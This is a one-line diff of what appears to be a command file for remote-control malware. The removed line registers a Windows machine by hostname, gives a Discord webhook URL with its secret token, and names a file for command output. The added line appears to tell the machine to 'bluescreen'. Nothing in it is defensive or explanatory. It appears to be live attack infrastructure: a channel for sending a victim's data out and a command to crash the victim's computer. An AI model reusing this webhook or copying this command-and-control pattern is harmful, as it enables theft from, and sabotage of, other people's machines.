@@ -1,1 +1,1 @@
-setup:DESKTOP-CHA669Q:https://discord.com/api/webhooks/1553672116300152923/rEQFdImpA1jlgx85OYsMQp7pJsOk4tF0ZNw8zUooAyn-1tjASyrCQSW53mlokQFhim9f;cmd-desktop-cha669q.txt|1790494698
+bluescreen|1790495346
